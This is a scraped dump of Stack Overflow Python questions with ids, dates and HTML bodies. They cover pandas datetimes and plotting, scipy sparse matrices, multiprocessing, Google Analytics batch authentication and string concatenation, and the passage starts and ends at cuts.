<pre><code>YYYY-MM-DD: HH:MM:SS.XXX
</code></pre>

<p>The starting date should be <strong>2016-09-20</strong>. </p>

<p>Here's what I have done: </p>

<pre><code># Create a dummy frame as an example: 
test = pd.DataFrame()
time = np.arange(0, 172800000, 10)
test['TIME'] = time
data = np.random.randint(0, 1000, size=len(time))
test['DATA'] = data

# Convert time to datetime:
test['TIME'] = pd.to_datetime(test['TIME'], unit='ms') 
</code></pre>

<p>If I check the head of the data frame, I get the following: </p>

<pre><code>             TIME           DATA
0   1970-01-01 00:00:00.000 681
1   1970-01-01 00:00:00.010 986
2   1970-01-01 00:00:00.020 957
3   1970-01-01 00:00:00.030 422
4   1970-01-01 00:00:00.040 319
</code></pre>

<p>How do I get the year, month, and day to start on 2016, 09, 20 and not 1970?</p>
"
39677070,4898004.0,2016-09-24 13:48:16+00:00,2,Procedure to map all relationships between elements in a list of lists,"<p>I'm looking for an algorithm that can map all the relationships between all of the elements in sublists belonging to a list of length <code>n</code>. </p>

<p>More concretely, suppose <code>a</code>, <code>b</code>, <code>c</code>, <code>d</code>, <code>e</code> and <code>f</code> are the names of workers and that each sublist represents a 'shift' that occurred yesterday. I'd like to know, for each worker, who worked with who yesterday.</p>

<pre><code>shifts_yesterday = [[a, b, c, d], [b, c, e, f]] 
</code></pre>

<p>Goal:</p>

<pre><code>a: b, c, d
b: a, c, d, e, f
c: a, b, d, e, f
d: a, b, c
e: b, c, f
f: b, c, e
</code></pre>

<p>Above, I can see that <code>a</code> worked with <code>b, c, d</code> yesterday; <code>b</code> worked with <code>a, c, d, e, f</code> yesterday, etc.</p>

<p>Time complexity is a concern here as I have a large list to process.
Though, intuitively, I suspect there is a pretty high floor on this one...</p>

<p>Note: I can obviously write a <strike>linear search</strike> straightforward approach with only <code>for</code> loops, but that is (a) not very clever (b) very slow.</p>

<h3>Edit:</h3>

<p>Here's (a messy) attempt:</p>

<pre><code>shifts = [['a', 'b', 'c', 'd'], ['b', 'c', 'e', 'f']]
workers = [i for s in shifts for i in s]

import collections
d = collections.defaultdict(list)

for w in workers:
    for s in shifts:
        for i in s:
            if i != w and w in s:
                if w in d.keys():
                    if i not in d[w]:
                        d[w].append(i)
                else:
                    d[w].append(i)
</code></pre>

<p>Test:</p>

<pre><code>for k, v in collections.OrderedDict(sorted(d.items())).items():
    print(k, v)
</code></pre>

<h3>Edit 2:</h3>

<p>Times:</p>

<ol>
<li><p>mine: <code>%%timeit -r 10</code> --> <code>10000 loops, best of 10: 19 Âµs per loop</code></p></li>
<li><p>Padraic Cunningham: <code>%%timeit -r 10</code> --> <code>100000 loops, best of 10:
4.89 Âµs per loop</code></p></li>
<li><p>zvone: <code>%%timeit -r 10</code> --> <code>100000 loops, best of 10: 3.88 Âµs per
loop</code></p></li>
<li><p>pneumatics: <code>%%timeit -r 10</code> --> <code>10000 loops, best of 10: 33.5 Âµs per loop</code></p></li>
</ol>
"
40050780,7020641.0,2016-10-14 19:35:09+00:00,2,root.query_pointer()._data causes high CPU usage,"<p>I'm a total noob in Python, programming and Linux. I wrote a simple python script to track usage time of various apps. I've noticed that after some time python is going nuts utilizing 100% of the CPU. Turns out it's the code obtaining mouse position is causing issues.</p>

<p>I've tried running this code in an empty python script:</p>

<pre><code>import time
from Xlib import display

while True:
    d = display.Display().screen().root.query_pointer()._data
    print(d[""root_x""], d[""root_y""])
    time.sleep(0.1)
</code></pre>

<p>It works but the CPU usage is increasing over time. With <code>time.sleep(1)</code> it takes some time but sooner or later it reaches crazy values.</p>

<p>I'm on Ubuntu 16.04.1 LTS using Python 3.5 with python3-xlib 0.15</p>
"
39713137,5865631.0,2016-09-26 22:05:19+00:00,2,How can I sort datetime columns by row value in a Pandas dataframe?,"<p>I'm new to Python and Pandas, and I've pulled in a database table that contains 15+ different datetime columns. My task is to sort these columns generally by earliest to latest value in the rows. However, the data is not clean; sometimes, where Column A's date would come before Column B's date in Row 0, A would come after B in Row 1. </p>

<p>I wrote a few functions (redacted here for simplicity) that compare two columns by calculating the percentage of times dates in A come before and after B, and then sorting the columns based on that percentage:</p>

<pre><code>def get_percentage(df, df_subset):
    return len(df_subset)/float(len(df))    

def duration_report(df, earlier_column, later_column):   
    results = {}
    td = df[later_column] - df[earlier_column]
    results[""Before""] = get_percentage(df, df.loc[td &gt;= pd.Timedelta(0)])
    results[""After""] = get_percentage(df, df.loc[td &lt;= pd.Timedelta(0)])
    ind = ""%s vs %s"" % (earlier_column, later_column)
    return pd.DataFrame(data=results, index=[ind])

def order_date_columns(df, col1, col2):
    before = duration_report(df, col1, col2).Before.values[0]
    after = duration_report(df, col1, col2).After.values[0]
    if before &gt;= after:
        return [col1, col2]
    else:
        return [col2, col1]
</code></pre>

<p>My goal with the above code is to programmatically implement the following: </p>

<blockquote>
  <p>If Col A dates come before Col B dates 50+% of the time, Col A should come before Col B in the list of earliest to latest datetime columns.</p>
</blockquote>

<p>The <code>order_date_columns()</code> function successfully sorts two columns into the correct order, but how do I apply this sorting to the 15+ columns at once? I've looked into <code>df.apply()</code>, <code>lambda</code>, and <code>map()</code>, but haven't been able to crack this problem. </p>

<p>Any help (with code clarity/efficiency, too) would be appreciated!</p>
"
40051073,7002564.0,2016-10-14 19:57:29+00:00,2,How do you store two different inputs from the same variable?,"<p>Had to delete most (of shown script). The code was a major part of my coursework, thus i'd rather others wouldn't see it and try to copy the majority of my code. I can leave the relevant part to the question though.</p>

<pre><code>while n == 1:
    w = input(""Input the product code: "")
</code></pre>

<p>As I said can't show the rest of the code. When a certain condition is met, then n is set to 0.<br>
Problem is that when a new code for w is entered, w is overwritten. For example, if w = 24, then w = 54, if you print(w) it will just print 54, since it's the latest input. How do you make it so that it prints all inputs for w?
<strong><em>FOR ALL YOU AWESOME PEOPLE THAT CONTRIBUTED THANK YOU!!</em></strong></p>
"
40051205,3746418.0,2016-10-14 20:06:32+00:00,2,Move python folder on linux,"<p>I have compiled python sources with the <code>--prefix</code> option. After running <code>make install</code> the binaries are copied to a folder of my account's home directory.</p>

<p>I needed to rename this folder but when I use pip after the renaming it says that it can't find the python interpreter. It shows an absolute path to the previous path (before renaming).</p>

<p>Using grep I found out multiple references to absolute paths relative to the <code>--prefix</code> folder.</p>

<p>I tried to override it by setting the <code>PATH</code>,<code>PYTHONPATH</code> and <code>PYTHONHOME</code> environment variables but it's not better.</p>

<p>Is there a way to compile the python sources in a way that I can freely moves it after ?</p>
"
40072950,2852677.0,2016-10-16 17:03:12+00:00,2,Concatenating pandas DataFrames keeping only rows with matching values in a column?,"<p>I am trying to ""merge-concatenate"" two pandas DataFrames. Basically, I want to stack the two DataFrames, but only keep the rows from each DataFrame which matching values in the other DataFrame. So for example:</p>

<pre><code>data1:

+---+------------+-----------+-------+
|   | first_name | last_name | class |
+---+------------+-----------+-------+
| 0 | Alex       | Anderson  |     1 |
| 1 | Amy        | Ackerman  |     2 |
| 2 | Allen      | Ali       |     3 |
| 3 | Alice      | Aoni      |     4 |
| 4 | Andrew     | Andrews   |     4 |
| 5 | Ayoung     | Atiches   |     5 |
+---+------------+-----------+-------+

data2:

+---+------------+-----------+-------+
|   | first_name | last_name | class |
+---+------------+-----------+-------+
| 0 | Billy      | Bonder    |     4 |
| 1 | Brian      | Black     |     5 |
| 2 | Bran       | Balwner   |     6 |
| 3 | Bryce      | Brice     |     7 |
| 4 | Betty      | Btisan    |     8 |
| 5 | Bruce      | Bronson   |     8 |
+---+------------+-----------+-------+
</code></pre>

<p>Then the resulting data frame after performing this operation on <code>data1</code> and <code>data2</code> should look like:</p>

<pre><code>result:

+---+------------+-----------+-------+
|   | first_name | last_name | class |
+---+------------+-----------+-------+
| 3 | Alice      | Aoni      |     4 |
| 4 | Andrew     | Andrews   |     4 |
| 5 | Ayoung     | Atiches   |     5 |
| 0 | Billy      | Bonder    |     4 |
| 1 | Brian      | Black     |     5 |
+---+------------+-----------+-------+
</code></pre>

<p>Basically, I'm trying to merge the two data sets, and then stack the columns. I can think of a couple ways to do this, but they're all sort of hack-y. I could merge <code>data1</code> and <code>data2</code> and then stack up the columns, or use a map like:</p>

<pre><code>map1 = data1['subject_id'].map(lambda x: x in list(data2['subject_id']))
map2 = data2['subject_id'].map(lambda x: x in list(data1['subject_id']))
pd.concat([data1[map1], data2[map2]])
</code></pre>

<p>But is there a more elegant solution to this?</p>
"
39711229,2605262.0,2016-09-26 19:50:51+00:00,2,TypeError for bar plot with custom date range,"<p>I'm attempting to display a dataframe as a bar graph with a custom date range for <code>xlim</code>. I'm able to output a graph if I select <code>kind='line'</code> but I get the following error message when attempting <code>kind='bar'</code>: </p>

<pre><code>TypeError: ufunc 'isfinite' not supported for the input types, and the inputs could not be safely coerced to any supported types according to the casting rule ''safe''
</code></pre>

<p>the dataframe looks as follows:</p>

<pre><code>df1 = 
     Date         Quantity
0    2010-01-01   1  
1    2010-01-02   0
2    2010-01-03   0
3    2010-01-04   2
4    2010-01-05   3
5    2010-01-06   1
6    2010-01-07   0
7    2010-01-08   1
8    2010-01-09   1
9    2010-01-10   2
10   2010-01-11   0
11   2010-01-12   5
12   2010-01-13   2
13   2010-01-14   1
14   2010-01-15   2
...
</code></pre>

<p>This works:</p>

<pre><code>df1.plot(x='Date', y='Quantity', kind='line', grid=False, legend=False, 
         xlim=['2010-01-01', '2010-01-10'], figsize=(40, 16))
</code></pre>

<p>but this doesn't</p>

<pre><code>    df1.plot(x='Date', y='Quantity', kind='bar', grid=False, legend=False, 
         xlim=['2010-01-01', '2010-01-10'], figsize=(40, 16))
</code></pre>

<p>Yet if I remove <code>xlim</code> from <code>kind='bar'</code> I produce an output. It would be nice to be able to output a bar graph with a custom x range.</p>
"
39677967,438223.0,2016-09-24 15:23:00+00:00,2,python sampling from different distributions with different probability,"<p>I am trying to implement a fucntion which returns 100 samples from three different multivariate gaussian distributions.</p>

<p>numpy provides a way to sample from a sinle multivariate gaussian. But I could not find a way to sample from three different multivariate with different sampling probability.</p>

<p>My requirement is to sample with probability $[0.7, 0.2, 0.1]$ from three multivariate gaussians with mean and covariances as given below</p>

<pre><code>G_1  mean = [1,1] cov =[ [ 5, 1] [1,5]]
G_2  mean = [0,0] cov =[ [ 5, 1] [1,5]]
G_3  mean = [-1,-1] cov =[ [ 5, 1] [1,5]]
</code></pre>

<p>Any idea ?</p>
"
39711838,1035859.0,2016-09-26 20:29:06+00:00,2,Find all-zero columns in pandas sparse matrix,"<p>For example I have a coo_matrix A :</p>

<pre><code>import scipy.sparse as sp
A = sp.coo_matrix([3,0,3,0],
                  [0,0,2,0],
                  [2,5,1,0],
                  [0,0,0,0])
</code></pre>

<p>How can I get result [0,0,0,1], which indicates that first 3 columns contain non-zero values, only the 4th column is all zeros.</p>

<p>PS : cannot convert A to other type.<br>
PS2 : I tried using <code>np.nonzeros</code> but it seems that my implementation is not very elegant.</p>
"
40072420,4421975.0,2016-10-16 16:13:38+00:00,2,Interpolate without having negative values in python,"<p>I've been trying to create a smooth line from these values but I can't have negative values in my result. So far all the methods I tried do give negative values. Would love some help.</p>

<pre><code>import matplotlib.pyplot as plt
from scipy.interpolate import UnivariateSpline
import numpy as np
y = np.asarray([0,5,80,10,1,10,40,30,80,5,0])
x = np.arange(len(y))

plt.plot(x, y, 'r', ms=5)
spl = UnivariateSpline(x, y)
xs = np.linspace(0,len(y)-1, 1000)
spl.set_smoothing_factor(2)

plt.plot(xs, spl(xs), 'g', lw=3)
plt.show()
</code></pre>

<p><a href=""https://i.stack.imgur.com/RY5hW.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/RY5hW.png"" alt=""enter image description here""></a></p>
"
39711625,1914026.0,2016-09-26 20:14:35+00:00,2,Trouble with authenticating Google Analytics API batch request in python app,"<p>Having trouble authenticating batch request for Google Analytics API.  </p>

<p>I have a credential .json file which looks like this.</p>

<pre>

    {
        ""type"": ""service_account"",
        ""project_id"": ""xxx"",
        ""private_key_id"": ""xxx"",
        ""private_key"": ""xxx"",
        ""client_email"": ""xxx"",
        ""client_id"": ""xxx"",
        ""client_secret"":""xxx"",
        ""auth_uri"": ""xxx"",
        ""token_uri"": ""xxx"",
        ""auth_provider_x509_cert_url"": ""xxx"",
        ""client_x509_cert_url"": ""xxx""
    }

</pre>

<p>This is my callback function </p>

<pre>

    def test_callback(request_id, response, exception):
        """"""Handle batched request responses.""""""
        print request_id
        if exception is not None:
            if isinstance(exception, HttpError):
                message = json.loads(exception.content)['error']['message']
                print ('Request %s returned API error : %s : %s ' %
                     (request_id, exception.resp.status, message))
            else:
                print response

</pre>

<p>This is where I authenticate </p>

<pre>

    """"""Init and return the Google Analytics service""""""
        CREDS = 'credentials/google.json'
        scopes = ['https://www.googleapis.com/auth/analytics.readonly']
        credentials = ServiceAccountCredentials.from_json_keyfile_name(CREDS, scopes)
        http = httplib2.Http()
        http = credentials.authorize(http)

</pre>

<p>This is where I try to add the batch request </p>

<pre>

    """"""
    This is the function I use in a helper file.  No execute on the end
    def ga_service_test(service, profile_id, start_date, end_date):
        # ensure lower case
        ids = ""ga:"" + profile_id
        metrics = ""ga:pageviewsPerSession""
        return service.data().ga().get(
            ids=ids, start_date=start_date, end_date=end_date, metrics=metrics
            )""""""

    # Build the Analytics Service Object with the authorized http object
        session = build('analytics', 'v3', http=http)

        batch = BatchHttpRequest(callback=test_callback)

        a_session = ga_service_test(session, a_id, yesterday.strftime('%Y-%m-%d'), i.strftime('%Y-%m-%d'))
        b_session = ga_service_test(session, b_id, yesterday.strftime('%Y-%m-%d'), i.strftime('%Y-%m-%d'))
        c_session = ga_service_test(session, c_id, yesterday.strftime('%Y-%m-%d'), i.strftime('%Y-%m-%d'))

        for request in [a_session, b_session, c_session]:
            batch.add(request)

        return batch.execute(http=httplib2.Http())

</pre>

<p>I continue to get this error in my terminal </p>

<pre>

    Traceback (most recent call last):
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/gunicorn/workers/sync.py"", line 135, in handle
    15:47:09 web.1  |     self.handle_request(listener, req, client, addr)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/gunicorn/workers/sync.py"", line 176, in handle_request
    15:47:09 web.1  |     respiter = self.wsgi(environ, resp.start_response)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1836, in __call__
    15:47:09 web.1  |     return self.wsgi_app(environ, start_response)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1820, in wsgi_app
    15:47:09 web.1  |     response = self.make_response(self.handle_exception(e))
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1403, in handle_exception
    15:47:09 web.1  |     reraise(exc_type, exc_value, tb)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1817, in wsgi_app
    15:47:09 web.1  |     response = self.full_dispatch_request()
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1477, in full_dispatch_request
    15:47:09 web.1  |     rv = self.handle_user_exception(e)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1381, in handle_user_exception
    15:47:09 web.1  |     reraise(exc_type, exc_value, tb)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1475, in full_dispatch_request
    15:47:09 web.1  |     rv = self.dispatch_request()
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/flask/app.py"", line 1461, in dispatch_request
    15:47:09 web.1  |     return self.view_functions[rule.endpoint](**req.view_args)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store/application.py"", line 84, in test
    15:47:09 web.1  |     return batch.execute(http=httplib2.Http())
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/oauth2client/util.py"", line 140, in positional_wrapper
    15:47:09 web.1  |     return wrapped(*args, **kwargs)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/googleapiclient/http.py"", line 1325, in execute
    15:47:09 web.1  |     self._execute(http, self._order, self._requests)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/googleapiclient/http.py"", line 1249, in _execute
    15:47:09 web.1  |     body = self._serialize_request(request)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/googleapiclient/http.py"", line 1120, in _serialize_request
    15:47:09 web.1  |     request.http.request.credentials.apply(headers)
    15:47:09 web.1  |   File ""/Users/bjones/test-app-two/data-store-two/venv/lib/python2.7/site-packages/oauth2client/client.py"", line 676, in apply
    15:47:09 web.1  |     headers['Authorization'] = 'Bearer ' + self.access_token
    15:47:09 web.1  | TypeError: cannot concatenate 'str' and 'NoneType' objects
    </pre>

<pre><code>This is my full .py file.  I am assuming it has something to do with my authentication process but I can't seem to figure it out.  If someone could help point me in the right direction it would help.  
</code></pre>

<pre>

    import requests
    import json

    from flask import Flask, request, jsonify, abort, render_template
    import time
    import calendar

    from datetime import datetime, date, timedelta
    import httplib2

    from apiclient.errors import HttpError
    from apiclient.discovery import build
    from apiclient.http import BatchHttpRequest
    from oauth2client.service_account import ServiceAccountCredentials

    # Helper functions from another file
    from utils.helpers import ga_service, get_sessions, ga_service_test, get_pageviewsPerSession, hyphendate

    from werkzeug.wsgi import DispatcherMiddleware

    app = Flask(__name__)

    # Uncomment the line below to turn on debugging locally
    app.debug = True

    def test_callback(request_id, response, exception):
        """"""Handle batched request responses.""""""
        print request_id
        if exception is not None:
            if isinstance(exception, HttpError):
                message = json.loads(exception.content)['error']['message']
                print ('Request %s returned API error : %s : %s ' %
                     (request_id, exception.resp.status, message))
            else:
                print response

    @app.route(""/test"")
    def test():
        a_id = 'xxx'
        b_id = 'xxx'
        c_id = 'xxx'
        i = datetime.now()
        yesterday = date.today()
        start = yesterday.strftime('%Y-%m-%d')
        end = i.strftime('%Y-%m-%d')

        """"""Init and return the Google Analytics service""""""
        CREDS = 'credentials/google.json'
        scopes = ['https://www.googleapis.com/auth/analytics.readonly']
        # Retrieve existing credendials
        credentials = ServiceAccountCredentials.from_json_keyfile_name(CREDS, scopes)
        http = httplib2.Http()
        http = credentials.authorize(http)

        # Build the Analytics Service Object with the authorized http object
        session = build('analytics', 'v3', http=http)

        batch = BatchHttpRequest(callback=test_callback)

        a_session = ga_service_test(session, a_id, yesterday.strftime('%Y-%m-%d'), i.strftime('%Y-%m-%d'))
        b_session = ga_service_test(session, b_id, yesterday.strftime('%Y-%m-%d'), i.strftime('%Y-%m-%d'))
        c_session = ga_service_test(session, c_id, yesterday.strftime('%Y-%m-%d'), i.strftime('%Y-%m-%d'))

        for request in [a_session, b_session, c_session]:
            batch.add(request)

        return batch.execute(http=httplib2.Http())

    if __name__ == ""__main__"":
        DispatcherMiddleware(app)

</pre>
"
39711560,230468.0,2016-09-26 20:10:58+00:00,2,programatically modify a given matplotlib color (e.g. RGBA tuple) to vary brightness or hue,"<p>I often am in a situation where I have a set of colors (lets say, <code>c = ['red', 'green', 'blue']</code>, but these may instead be RGBA specifications instead of strings) which I'm using to plot a corresponding set of parameters.  I then decide that I want to plot two variations of each parameter, so I'd like to end up with a 2x3 array of colors like <code>[['red', 'light-red'], ['blue', 'light-blue'], ['green', 'light-green']]</code>.  <strong>Is there a way to programatically modify a given color (as a string or RGBA tuple) to be lighter/darker/hue'ier/saturated'er?</strong></p>
"
39711492,3716774.0,2016-09-26 20:06:39+00:00,2,Why concurrent.future executor is not using all my cores?,"<p>Here is my snippet:</p>

<pre><code>from concurrent.futures import ProcessPoolExecutor

def Fun(i):
    do something

with ProcessPoolExecutor(max_workers = 8) as e:
    e.map(Fun, range(10000000), chunksize = int(10000000/256))
</code></pre>

<p>I have 8 cores, however, this only uses 4 of my cores.</p>

<p>When I use multiprocessing module, all of my 8 cores can be used. For example:</p>

<pre><code>with Pool(8) as p:
    p.map_async(Fun, range(10000000))
    p.close()
    p.join()
</code></pre>

<p>I don't understand why. In addition, if the chunk size in the <code>e.map()</code> is too large or too small, the usage of my CPU would go down, which seems not to be a problem when using multiprocessing</p>
"
40071214,7026515.0,2016-10-16 14:08:16+00:00,2,What are routine and subroutine in program?,"<p>I am learning stack and hearing this word called ""Subroutine"" too much. I am confused: what are exactly ""routine"" and ""subroutine"" ? </p>

<p>Let's suppose I have a program :</p>

<pre><code>def tav(x):
    if x==0:
       return 19
    else:
       u=1
       tav(x-1)
       u+=1
tav(4)
</code></pre>

<p>So what are routine and subroutine in this program? I have read somewhere subroutine doesn't return anything so if I am getting right the inner portion of main function called subroutine or we can say directly subroutine is subprogram so in the above program subroutine should be:</p>

<pre><code>if x==0:
    return 19
else:
    u=1
    tav(x-1)
    u+=1
</code></pre>

<p>Am I getting it right?</p>
"
39680733,3598726.0,2016-09-24 20:35:04+00:00,2,Empty .mp4 file created after making video from matplotlib using matplotlib.animation,"<p>I found this little code, and I am able to save a video (random colors changing in a grid) using it:</p>

<pre><code>import numpy as np
import matplotlib
matplotlib.use(""Agg"")
import matplotlib.pyplot as plt
import matplotlib.animation as animation
from scipy import rand

Writer = animation.writers['ffmpeg']
writer = Writer(fps=15, metadata=dict(artist='xy'), bitrate=3600)

fig = plt.figure()
frames = []
for add in np.arange(15):
    base = rand(10, 10)
    frames.append((plt.pcolormesh(base, ),))

im_ani = animation.ArtistAnimation(fig, frames, interval=500, repeat_delay=3000,
                               blit=True)
im_ani.save('Vid.mp4', writer=writer)
</code></pre>

<p>I tried to insert it into my simulation, I get no errors, but the video is empty, the whole picture is white. Can you help me with that? This is the simplest case where I got it:</p>

<pre><code>class Dummy():

    def __init__(self):
        self.video=[]

    def addFrame(self):

        Frame=rand(10,10)
        print (Frame)
        self.video.append((plt.pcolormesh(Frame),))

    def saveVideo(self):

        Writer = animation.writers['ffmpeg']
        writer = Writer(fps=15, metadata=dict(artist='XY'), bitrate=3600)
        fig = plt.figure()

        im_ani = animation.ArtistAnimation(fig, self.video, interval=500, repeat_delay=3000,
                               blit=True)
        im_ani.save('myVid.mp4', writer=writer, dpi=dpi)
</code></pre>

<p>You can try it out:</p>

<pre><code>from scipy import rand

foo=Dummy()

for i in range(20):
   foo.addFrame()

foo.saveVideo()
</code></pre>
"
40071096,7026755.0,2016-10-16 13:56:36+00:00,2,How to plot multiple lines in one figure in Pandas Python based on data from multiple columns?,"<p>I have a dataframe with 3 columns, like this:</p>

<pre><code>df['year'] = ['2005, 2005, 2005, 2015, 2015, 2015, 2030, 2030, 2030']
df['name'] = ['A', 'B', 'C', 'A', 'B', 'C', 'A', 'B', 'C']
df['weight'] = [80, 65, 88, 65, 60, 70, 60, 55, 65]
</code></pre>

<p>how can I plot a line for A, B and  C, where it shows how their weight develops through the years. So I tried this: </p>

<pre><code>df.groupby(""euro"").plot(x=""year"", y=""MKM"")
</code></pre>

<p>However, I get multiple plots and that is not what I want. I want all those plots in one figure. </p>
"
39706242,4044400.0,2016-09-26 15:04:45+00:00,2,P value for Normality test very small despite normal histogram,"<p>I've looked over the normality tests in scipy stats for both <a href=""http://docs.scipy.org/doc/scipy-0.14.0/reference/generated/scipy.stats.mstats.normaltest.html"" rel=""nofollow"">scipy.stats.mstats.normaltest</a> as well as <a href=""http://docs.scipy.org/doc/scipy/reference/generated/scipy.stats.shapiro.html"" rel=""nofollow"">scipy.stats.shapiro</a> and it looks like they both assume the null hypothesis is that the data they're given is normal.</p>

<p>Ie, a p value less than .05 would indicate that they're not normal.  </p>

<p>I'm doing a regression with LassoCV in SKLearn, and in order to give myself better results I log transformed the answers, which gives a histogram that looks like this:</p>

<p><a href=""http://i.stack.imgur.com/poo2E.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/poo2E.png"" alt=""Histogram of data""></a></p>

<p>Looks normal to me.  </p>

<p>However, when I run the data through either of the two tests mentioned above I get very small p values that would indicate the data is not normal, and in a big way.</p>

<p>This is what I get when I use scipy.stats.shapiro</p>

<pre><code>scipy.stats.shapiro(y)
Out[69]: (0.9919402003288269, 3.8889791653673456e-07)
</code></pre>

<p>And I get this when I run scipy.stats.mstats.normaltest:</p>

<pre><code>scipy.stats.mstats.normaltest(y)
NormaltestResult(statistic=25.755128535282189, pvalue=2.5547293546709236e-06)
</code></pre>

<p>It seems implausible to me that my data would test out as being so far from normality with the histogram it has.</p>

<p>Is there something causing this discrepancy, or am I not interpreting the results correctly?</p>
"
39685168,6296268.0,2016-09-25 09:07:35+00:00,2,scipy.sparse matrix: subtract row mean to nonzero elements,"<p>I have a sparse matrix in <a href=""http://docs.scipy.org/doc/scipy-0.14.0/reference/generated/scipy.sparse.csr_matrix.html"" rel=""nofollow"">csr_matrix</a> format. For each row i need to subtract row mean from the nonzero elements. The means must be computed on the number of the nonzero elements of the row (instead of the length of the row).
I found a fast way to compute the row means with the following code:</p>

<pre><code># M is a csr_matrix
sums = np.squeeze(np.asarray(M.sum(1)))    # sum of the nonzero elements, for each row
counts = np.diff(M.tocsr().indptr)         # count of the nonzero elements, for each row


# for the i-th row the mean is just sums[i] / float(counts[i]) 
</code></pre>

<p>The problem is the updates part. I need a fast way to do this.
Actually what i am doing is to transform M to a <a href=""http://docs.scipy.org/doc/scipy/reference/generated/scipy.sparse.lil_matrix.html"" rel=""nofollow"">lil_matrix</a> and perform the updates in this way:</p>

<pre><code>M = M.tolil()

for i in xrange(len(sums)):
    for j in M.getrow(i).nonzero()[1]:
        M[i, j] -= sums[i] / float(counts[i])
</code></pre>

<p>which is slow. Any suggestion for a faster solution?</p>
"
39675898,3417327.0,2016-09-24 11:37:39+00:00,2,Is python += string concatenation bad practice?,"<p>I am reading <a href=""http://docs.python-guide.org/en/latest/writing/structure/#mutable-and-immutable-types"" rel=""nofollow"">The Hitchhikerâs Guide to Python</a> and there is a short code snippet </p>

<pre><code>foo = 'foo'
bar = 'bar'

foobar = foo + bar  # This is good
foo += 'ooo'  # This is bad, instead you should do:
foo = ''.join([foo, 'ooo'])
</code></pre>

<p>The author pointed out that <code>''.join()</code> is not always faster than <code>+</code>, so he is not against using <code>+</code> for string concatenation. </p>

<p>But why is <code>foo += 'ooo'</code> bad practice whereas <code>foobar=foo+bar</code> is considered good? </p>

<ul>
<li>is <code>foo += bar</code> good?</li>
<li>is <code>foo = foo + 'ooo'</code> good?</li>
</ul>

<p>Before this code snippet, the author wrote:</p>

<blockquote>
  <p>One final thing to mention about strings is that using join() is not always best. In the instances where you are creating a new string from a pre-determined number of strings, using the addition operator is actually faster, but in cases like above or in cases where you are adding to an existing string, using join() should be your preferred method.</p>
</blockquote>
"
39685757,5140369.0,2016-09-25 10:19:22+00:00,2,How to make a new filter and apply it on an image using cv2 in python2.7?,"<p>How to make a new filter and apply it on an image using cv2 in python2.7?</p>

<p>For example:</p>

<pre><code>kernel = np.array([[-1, -1, -1],
                   [-1,  4, -1],
                   [-1, -1, -1]])
</code></pre>

<p>i'm new to opencv so if you can explain that'd be great. thanks!</p>
"
39690301,4992248.0,2016-09-25 18:26:25+00:00,2,How to split string with different phones using re?,"<p>For example there are such phones:</p>

<pre><code>phones = '+35(123) 456 78 90 (123) 555 55 55  (908)985 88 89   (593)592 56 95'
</code></pre>

<p>I need to get:</p>

<pre><code>phones_list = ['+35(123) 456 78 90', '(123) 555 55 55', '(908)985 88 89', (593)592 56 95]
</code></pre>

<p>Trying to solve using <code>re</code>, but quite a hard task to me.</p>
"
40064202,1953232.0,2016-10-15 21:06:00+00:00,2,Python: importing a sub-package module from both the sub-package and the main package,"<p>Here we go with my first ever stackoverflow quesion. I did search for an answer, but couldn't find a clear one. Here's the situation. I've got a structure like this:</p>

<pre><code>myapp
    package/
         __init.py__
         main.py
         mod1.py
         mod2.py
</code></pre>

<p>Now, in this scenario, from main.py I am importing mod1.py, which also needs to be imported by mod2.py. Everything works fine, my imports look like this:</p>

<p>main.py:</p>

<pre><code>from mod1 import Class1
</code></pre>

<p>mod2.py:</p>

<pre><code>from mod1 import Class1
</code></pre>

<p>However, I need to move my main.py to the main folder structure, like this:</p>

<pre><code>myapp
    main.py
    package/
         __init.py__
         mod1.py
         mod2.py
</code></pre>

<p>And now what happens is that of course I need to change the way I import mod1 inside main.py:</p>

<pre><code>from package.mod1 import Class1
</code></pre>

<p>However, what also happens is that in order not to get an ""ImportError: No module named 'mod1'"", I have make the same type of change inside mod2.py:</p>

<pre><code>from package.mod1 import Class1
</code></pre>

<p>Why is that? mod2 is in the same folder/pakcage as mod1, so why - upon modifying main.py - am I expected to modify my import inside mod2?</p>
"
40059330,4434288.0,2016-10-15 13:01:51+00:00,2,Advanced array concatenation python,"<p>Say I have four multi-dimensional arrays - </p>

<pre><code>a = [[""a"",""a"",""a""],
    [""a"",""a"",""a""],
    [""a"",""a"",""a""]]
b = [[""b"",""b"",""b""],
    [""b"",""b"",""b""],
    [""b"",""b"",""b""]]
c = [[""c"",""c"",""c""],
    [""c"",""c"",""c""],
    [""c"",""c"",""c""]]
d = [[""d"",""d"",""d""],
    [""d"",""d"",""d""],
    [""d"",""d"",""d""]]
</code></pre>

<p>and I want to combine them into a single array like</p>

<pre><code>total = [[""a"",""a"",""a"",""b"",""b"",""b""],
        [""a"",""a"",""a"",""b"",""b"",""b""],
        [""a"",""a"",""a"",""b"",""b"",""b""], 
        [""c"",""c"",""c"",""d"",""d"",""d""],
        [""c"",""c"",""c"",""d"",""d"",""d""],
